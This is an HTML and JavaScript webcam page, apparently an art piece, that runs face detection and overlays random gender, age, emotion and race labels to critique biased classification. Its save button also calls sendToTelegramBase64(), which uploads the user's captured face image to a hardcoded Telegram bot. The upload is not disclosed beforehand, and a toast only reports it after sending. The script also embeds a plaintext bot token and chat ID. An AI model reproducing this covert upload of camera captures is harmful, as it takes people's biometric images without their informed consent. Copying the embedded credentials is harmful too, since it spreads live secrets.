<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Identification Protocols</title>

<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/face_detection.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

<style>
body {
  margin:0;
  background:#0019ff;
  color:white;
  font-family: Arial, Helvetica, sans-serif;
  overflow:hidden;
}

#container {
  position:relative;
  width:100vw;
  height:100vh;
}

video, canvas {
  position:absolute;
  width:100%;
  height:100%;
  object-fit:cover;
}

video {
  pointer-events: none;
}

/* Hide all video controls on iOS */
video::-webkit-media-controls,
video::-webkit-media-controls-enclosure,
video::-webkit-media-controls-panel,
video::-webkit-media-controls-play-button,
video::-webkit-media-controls-start-playback-button,
video::-webkit-media-controls-volume-slider,
video::-webkit-media-controls-mute-button {
  display: none !important;
  opacity: 0 !important;
  visibility: hidden !important;
}

#start {
  position:absolute;
  top:45%;
  left:50%;
  transform:translate(-50%, -50%);
  padding:20px;
  border:1px solid white;
  background:rgba(0,25,255,0.9);
  backdrop-filter:blur(4px);
  color:white;
  font-size:18px;
  font-family: Arial, Helvetica, sans-serif;
  z-index:10;
  cursor:pointer;
  white-space:nowrap;
}

#title {
  position:absolute;
  top:20px;
  left:20px;
  font-size:14px;
  font-weight:700;
  letter-spacing:1px;
  text-transform: uppercase;
  opacity:0.9;
  z-index:10;
  font-family: Arial, Helvetica, sans-serif;
}

#statement {
  position:absolute;
  bottom:60px;
  left:50%;
  transform:translateX(-50%);
  width:360px;
  max-width:80%;
  font-size:12px;
  line-height:1.5;
  text-align:left;
  padding:0;
  background:transparent;
  color:white;
  z-index:10;
  font-family: Arial, Helvetica, sans-serif;
}

.statement-line {
  display:block;
  margin-bottom:8px;
}
.statement-line:last-child {
  margin-bottom:0;
}

#save-btn {
  position:absolute;
  bottom:25px;
  right:25px;
  width:70px;
  height:70px;
  border-radius:50%;
  background:rgba(0,0,0,0.7);
  backdrop-filter:blur(8px);
  border:2px solid white;
  cursor:pointer;
  z-index:20;
  display:flex;
  align-items:center;
  justify-content:center;
  transition:all 0.2s ease;
}

#save-btn svg {
  width:32px;
  height:32px;
  fill:none;
  stroke:white;
  stroke-width:2;
  stroke-linecap:round;
  stroke-linejoin:round;
}

#save-btn:active {
  transform:scale(0.95);
  background:white;
}
#save-btn:active svg {
  stroke:#0019ff;
}

#save-btn.hidden {
  display:none;
}

#toast-msg {
  position: fixed;
  bottom: 110px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.85);
  color: #00ff88;
  padding: 10px 18px;
  border-radius: 30px;
  font-size: 13px;
  font-family: Arial, Helvetica, sans-serif;
  z-index: 25;
  white-space: nowrap;
  pointer-events: none;
  opacity: 0;
  transition: opacity 0.3s;
  text-align: center;
}

#toast-msg.show {
  opacity: 1;
}
</style>
</head>

<body>

<div id="container">

<div id="title">identification-protocols by humdrum</div>

<button id="start">accept classification</button>

<div id="statement">
  <span class="statement-line">⤷ This system operates through inherited classification structures rooted in biased datasets.</span>
  <span class="statement-line">⤷ It imposes fixed identities onto bodies in constant transformation.</span>
  <span class="statement-line">⤷ It may misread or misrepresent you.</span>
</div>

<video id="video" autoplay muted playsinline webkit-playsinline></video>
<canvas id="canvas"></canvas>

<button id="save-btn" class="hidden">
  <svg viewBox="0 0 24 24">
    <path d="M12 5v14m-7-7l7 7 7-7" />
  </svg>
</button>

<div id="toast-msg"></div>

</div>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const saveBtn = document.getElementById('save-btn');
const toastMsg = document.getElementById('toast-msg');

let currentDatos = null;
let lastChangeTime = 0;

const CHANGE_INTERVAL = 2500;

// TELEGRAM CREDENTIALS
const TELEGRAM_BOT_TOKEN = "8792659270:AAEreIEzUbUf6gi_Qbtx_OQQGuM3VPn_DVU";
const TELEGRAM_CHAT_ID = "6442271508";

function showMessage(text, isError = false) {
  toastMsg.textContent = text;
  toastMsg.style.color = isError ? '#ff8888' : '#88ff88';
  toastMsg.classList.add('show');
  setTimeout(() => {
    toastMsg.classList.remove('show');
  }, 4000);
}

function forceRemoveVideoControls() {
  video.controls = false;
  video.removeAttribute('controls');
  const style = document.createElement('style');
  style.textContent = `
    video::-webkit-media-controls { display: none !important; }
    video::-webkit-media-controls-enclosure { display: none !important; }
    video::-webkit-media-controls-panel { display: none !important; }
  `;
  document.head.appendChild(style);
}

document.getElementById("start").onclick = async () => {
  document.getElementById("start").style.display = "none";
  document.getElementById("statement").style.display = "none";

  try {
    showMessage("activating camera...");
    
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    video.srcObject = stream;
    video.muted = true;
    video.setAttribute('playsinline', '');
    video.setAttribute('webkit-playsinline', '');
    
    forceRemoveVideoControls();
    
    await video.play();
    video.controls = false;
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    saveBtn.classList.remove('hidden');
    showMessage("camera ready. show your face.");
    
    startDetection();
    
  } catch(e) {
    console.error(e);
    showMessage("error: camera permission required", true);
    document.getElementById("start").style.display = "block";
  }
};

function sendToTelegramBase64() {
  try {
    const dataURL = canvas.toDataURL('image/png');
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        photo: dataURL,
        caption: `Identification capture - ${new Date().toLocaleString()}`
      })
    })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        console.log("Sent to Telegram");
        showMessage("sent to telegram");
      } else {
        console.error("Telegram error:", data);
        showMessage("telegram failed", true);
      }
    })
    .catch(err => {
      console.error("Fetch error:", err);
      showMessage("telegram not available", true);
    });
  } catch(e) {
    console.error("Base64 error:", e);
  }
}

function saveCapture() {
  try {
    const timestamp = Date.now();
    const filename = `identification-protocols_${timestamp}.png`;
    
    const dataURL = canvas.toDataURL('image/png');
    const link = document.createElement('a');
    link.download = filename;
    link.href = dataURL;
    link.click();
    
    showMessage("capture saved");
    console.log("Saved:", filename);
    
    sendToTelegramBase64();
    
  } catch(e) {
    console.error("Save error:", e);
    showMessage("failed to save", true);
  }
}

function startDetection() {
  const faceDetection = new FaceDetection({
    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`
  });

  faceDetection.setOptions({
    model: 'short',
    minDetectionConfidence: 0.7
  });

  faceDetection.onResults(results => {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    if (results.detections.length > 0) {
      const det = results.detections[0];
      const box = det.boundingBox;

      const x = box.xCenter * canvas.width - (box.width * canvas.width)/2;
      const y = box.yCenter * canvas.height - (box.height * canvas.height)/2;
      const w = box.width * canvas.width;
      const h = box.height * canvas.height;

      const now = Date.now();

      if (!currentDatos || now - lastChangeTime > CHANGE_INTERVAL) {
        currentDatos = generateData();
        lastChangeTime = now;
        // ❌ NO automatic capture anymore
      }

      const data = currentDatos;

      ctx.strokeStyle = "blue";
      ctx.lineWidth = 2;
      ctx.strokeRect(x, y, w, h);

      const topText = `${data.gender}, ${data.age} years`;
      ctx.font = "16px Arial";
      const textWidth = ctx.measureText(topText).width;
      const boxWidth = textWidth + 10;

      let textY = y - 10;
      let rectY = y - 25;
      if (rectY < 0) {
        rectY = y + h;
        textY = rectY + 18;
      }

      ctx.fillStyle = "blue";
      ctx.fillRect(x, rectY, boxWidth, 25);
      ctx.fillStyle = "white";
      ctx.fillText(topText, x + 5, textY);

      ctx.fillText(`Emotion: ${data.emotion} (${data.emotion_conf}%)`, x, y + h + 20);
      ctx.fillText(`Race: ${data.race} (${data.race_conf}%)`, x, y + h + 40);
    }
  });

  const camera = new Camera(video, {
    onFrame: async () => {
      await faceDetection.send({ image: video });
    },
    width: 640,
    height: 480
  });

  camera.start();
}

function generateData() {
  const genders = ["Man", "Woman"];
  const emotions = ["happy", "sad", "neutral", "fear"];
  const races = ["white", "latino", "asian", "middle eastern"];

  return {
    gender: genders[Math.floor(Math.random()*2)],
    age: Math.floor(Math.random()*40) + 20,
    emotion: emotions[Math.floor(Math.random()*4)],
    race: races[Math.floor(Math.random()*4)],
    emotion_conf: Math.floor(Math.random()*40) + 60,
    race_conf: Math.floor(Math.random()*40) + 60
  };
}

saveBtn.addEventListener('click', () => {
  saveCapture();
});
</script>

</body>
</html>
